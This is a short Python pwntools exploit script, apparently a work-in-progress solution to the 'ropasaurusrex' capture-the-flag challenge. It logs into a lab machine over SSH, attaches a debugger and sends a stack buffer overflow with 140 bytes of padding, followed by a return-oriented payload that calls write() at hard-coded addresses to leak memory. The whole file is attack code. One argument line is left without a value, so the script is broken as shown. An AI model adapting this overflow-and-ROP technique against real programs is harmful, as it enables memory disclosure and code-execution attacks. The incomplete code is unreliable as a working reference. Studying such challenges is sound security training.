from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h'] 

ssh = ssh("federicomegler", "10.211.55.3")
r = ssh.process("./ropasaurusrex")

gdb.attach(r, """c
""")

write = 0x0804830c
arg1 = 1
arg2 = 0x08049614
arg3 = 

payload = p32(write) + "BBBB" + p32(arg1) + p32(arg2) + p32(arg3)

r.send("A" * 140 + payload)

r.interactive();
